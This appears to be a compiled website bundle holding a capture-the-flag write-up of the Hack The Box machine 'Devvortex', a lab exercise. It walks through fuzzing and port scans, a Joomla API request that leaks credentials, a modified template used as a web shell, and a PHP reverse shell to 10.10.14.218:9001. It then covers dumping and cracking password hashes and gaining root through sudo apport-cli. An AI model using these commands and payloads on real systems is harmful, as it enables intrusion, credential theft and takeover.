"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[9722],{6683:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>a,default:()=>l,frontMatter:()=>i,metadata:()=>s,toc:()=>h});const s=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/easy/Devvortex","title":"Devvortex","description":"Enumeration","source":"@site/docs/Hacking/Write-ups/Hack the box/easy/Devvortex.md","sourceDirName":"Hacking/Write-ups/Hack the box/easy","slug":"/write-up/htb/easy/devvortex","permalink":"/docs/write-up/htb/easy/devvortex","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/easy/devvortex","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var r=n(4848),o=n(8453);const i={slug:"/write-up/htb/easy/devvortex",pagination_next:null,pagination_prev:null},a=void 0,c={},h=[{value:"Enumeration",id:"enumeration",level:2},{value:"Foothold",id:"foothold",level:2},{value:"Lateral movement",id:"lateral-movement",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}];function d(e){const t={a:"a",code:"code",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(t.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,r.jsxs)(t.p,{children:["First of all, we access via browser to the IP and got redirected to ",(0,r.jsx)(t.a,{href:"http://devvortex.htb/",children:"http://devvortex.htb/"}),", let's add it to /etc/hosts."]}),"\n",(0,r.jsxs)(t.p,{children:["Navigating a bit, we can see that it might be vulnerable to file inclusion, since requesting an non-existing page: ",(0,r.jsx)(t.a,{href:"http://devvortex.htb/aa.html",children:"http://devvortex.htb/aa.html"})," showed a nginx server error"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"\u2514\u2500$ whatweb http://devvortex.htb                 \nhttp://devvortex.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]\n"})}),"\n",(0,r.jsxs)(t.p,{children:["Let's try to extract all the files we can find in the server with ",(0,r.jsx)(t.code,{children:"fuff"}),":"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"ffuf -w /opt/github/SecLists/Discovery/Web-Content/common.txt:FUFF -u http://devvortex.htb/FUFF.html\n"})}),"\n",(0,r.jsx)(t.p,{children:"So far, nothing weird appears to be accessible:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{children:"about                   [Status: 200, Size: 7388, Words: 2258, Lines: 232, Duration: 40ms]\ncontact                 [Status: 200, Size: 8884, Words: 3156, Lines: 290, Duration: 207ms]\ndo                      [Status: 200, Size: 7603, Words: 2436, Lines: 255, Duration: 38ms]\nindex                   [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 45ms]\nportfolio               [Status: 200, Size: 6845, Words: 2083, Lines: 230, Duration: 42ms]\n"})}),"\n",(0,r.jsxs)(t.p,{children:["The images are served from ",(0,r.jsx)(t.a,{href:"http://devvortex.htb/images/hero-bg.jpg",children:"http://devvortex.htb/images/hero-bg.jpg"}),", if we try to access /images we get 403, let's try to fuzz the directories by checking if they return 403:"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{children:"images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 43ms]\ncss                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 42ms]\njs                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 52ms]\n                        [Status: 200, Size: 18048, Words: 6791, Lines: 584, Duration: 47ms]\n"})}),"\n",(0,r.jsx)(t.p,{children:"Nothing so far, let's check what other ports are open with nmap:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{children:"\u2514\u2500$ nmap devvortex.htb   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:42 CET\nNmap scan report for devvortex.htb (10.10.11.242)\nHost is up (0.038s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n"})}),"\n",(0,r.jsx)(t.p,{children:"Let's check versions:"}),"\n",(0,r.jsx)(t.p,{children:"http"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{children:"\u2514\u2500$ nmap devvortex.htb -p80 -sC -sV -Pn\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:43 CET\nNmap scan report for devvortex.htb (10.10.11.242)\nHost is up (0.037s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: DevVortex\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.51 seconds\n"})}),"\n",(0,r.jsx)(t.p,{children:"ssh"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{children:"\u2514\u2500$ nmap devvortex.htb -p22 -sC -sV -Pn\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:43 CET\nNmap scan report for devvortex.htb (10.10.11.242)\nHost is up (0.039s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1.53 seconds\n"})}),"\n",(0,r.jsx)(t.p,{children:"Nothing seems weird, let's try to scan for ALL ports opened, nothing else found."}),"\n",(0,r.jsx)(t.p,{children:"Let's enumerate subdomains by using the Host header:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:'ffuf -w /opt/github/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -fl 8\n'})}),"\n",(0,r.jsx)(t.p,{children:"Got this subdomain:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{children:"dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 88ms]\n"})}),"\n",(0,r.jsxs)(t.p,{children:["which looks like it's serving php content: ",(0,r.jsx)(t.code,{children:"http://dev.devvortex.htb/index.php"})]}),"\n",(0,r.jsx)(t.p,{children:"A simple scan with ffuf reveals interesting stuff:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{children:".git/logs/              [Status: 403, Size: 3653, Words: 792, Lines: 70, Duration: 90ms]\nconfiguration           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 39ms]\nindex                   [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 80ms]\n"})}),"\n",(0,r.jsx)(t.p,{children:"With .git/log we can reconstruct the source code but it's returning a 403.\nconfiguration.php looks like a blank page, but it's a PHP page, so it would be interesting to note it for future usage."}),"\n",(0,r.jsx)(t.p,{children:"Let's enumerate directories:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{children:"home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 465ms]\n"})}),"\n",(0,r.jsxs)(t.ul,{children:["\n",(0,r.jsxs)(t.li,{children:[(0,r.jsx)(t.a,{href:"http://dev.devvortex.htb/error.php",children:"http://dev.devvortex.htb/error.php"}),"  --\x3e File not found."]}),"\n",(0,r.jsxs)(t.li,{children:[(0,r.jsx)(t.a,{href:"http://dev.devvortex.htb/any.php",children:"http://dev.devvortex.htb/any.php"}),"  --\x3e File not found."]}),"\n"]}),"\n",(0,r.jsx)(t.p,{children:"Looks a possible LFI attack vector, checking /robots.txt reveals this is a Joomla CMS page."}),"\n",(0,r.jsxs)(t.p,{children:["Following the paths in the robots.txt, we can see this URL: ",(0,r.jsx)(t.a,{href:"http://dev.devvortex.htb/administrator/index.php",children:"http://dev.devvortex.htb/administrator/index.php"})]}),"\n",(0,r.jsx)(t.p,{children:"Now that we know it's a Joomla CMS page, let's make a Google search, and we found the following links:"}),"\n",(0,r.jsxs)(t.ul,{children:["\n",(0,r.jsx)(t.li,{children:(0,r.jsx)(t.a,{href:"https://hackertarget.com/attacking-enumerating-joomla/",children:"https://hackertarget.com/attacking-enumerating-joomla/"})}),"\n",(0,r.jsx)(t.li,{children:(0,r.jsx)(t.a,{href:"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla",children:"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla"})}),"\n",(0,r.jsx)(t.li,{children:(0,r.jsx)(t.a,{href:"https://vulncheck.com/blog/joomla-for-rce",children:"https://vulncheck.com/blog/joomla-for-rce"})}),"\n"]}),"\n",(0,r.jsx)(t.h2,{id:"foothold",children:"Foothold"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true\n"})}),"\n",(0,r.jsx)(t.p,{children:"According to the articles, this URLS leaks the user/password for the mysql database used by joomla. However, the same user/password has been re-used for the Joomla CMS admin user"}),"\n",(0,r.jsx)(t.p,{children:"Once we have admin access to joomla instance, we can modify a template php files to include RCE, e.g.:"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.a,{href:"http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=id",children:"http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=id"})}),"\n",(0,r.jsx)(t.p,{children:"Now let's send a reverse shell:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:'php -r \'$sock=fsockopen("10.10.14.218",9001);popen("/bin/sh <&3 >&3 2>&3", "r");\'\n'})}),"\n",(0,r.jsx)(t.p,{children:"with URL-encode:"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.a,{href:"http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.14.218%22%2C9001%29%3Bpopen%28%22%2Fbin%2Fsh%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27",children:"http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.14.218%22%2C9001%29%3Bpopen%28%22%2Fbin%2Fsh%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27"})}),"\n",(0,r.jsxs)(t.p,{children:["We got a reverse-shell, but to ",(0,r.jsx)(t.code,{children:"www-data"})," user, in order to get the flag, we need to get access to ",(0,r.jsx)(t.code,{children:"logan"})," user."]}),"\n",(0,r.jsx)(t.h2,{id:"lateral-movement",children:"Lateral movement"}),"\n",(0,r.jsx)(t.p,{children:"According to the article, the leaked credentials are used to connect the MySQL database, so, let's connect to the DB re-using the credentials."}),"\n",(0,r.jsx)(t.p,{children:"We go to the users table and see the hashed passwords:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"mysql> select username,password from sd4fg_users;\n+----------+--------------------------------------------------------------+\n| username | password                                                     |\n+----------+--------------------------------------------------------------+\n| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |\n| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |\n+----------+--------------------------------------------------------------+\n"})}),"\n",(0,r.jsx)(t.p,{children:"We can try to crack the hash with hashcat:"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"hashcat exfil/hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt\n"})}),"\n",(0,r.jsx)(t.p,{children:"and it worked, it reveal the password for the user logan, now we can connect with SSH and read the user flag."}),"\n",(0,r.jsx)(t.h2,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"logan@devvortex:~$ sudo -l\n[sudo] password for logan: \nMatching Defaults entries for logan on devvortex:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser logan may run the following commands on devvortex:\n    (ALL : ALL) /usr/bin/apport-cli\n"})}),"\n",(0,r.jsxs)(t.p,{children:["Just do a quick search about the sudoable app and found a poc to get root access: ",(0,r.jsx)(t.a,{href:"https://github.com/diego-tella/CVE-2023-1326-PoC",children:"https://github.com/diego-tella/CVE-2023-1326-PoC"})]}),"\n",(0,r.jsx)(t.p,{children:"I tired and it just worked giving root access and we got root flag."})]})}function l(e={}){const{wrapper:t}={...(0,o.R)(),...e.components};return t?(0,r.jsx)(t,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,t,n)=>{n.d(t,{R:()=>i,x:()=>a});var s=n(6540);const r={},o=s.createContext(r);function i(e){const t=s.useContext(o);return s.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function a(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),s.createElement(o.Provider,{value:t},e.children)}}}]);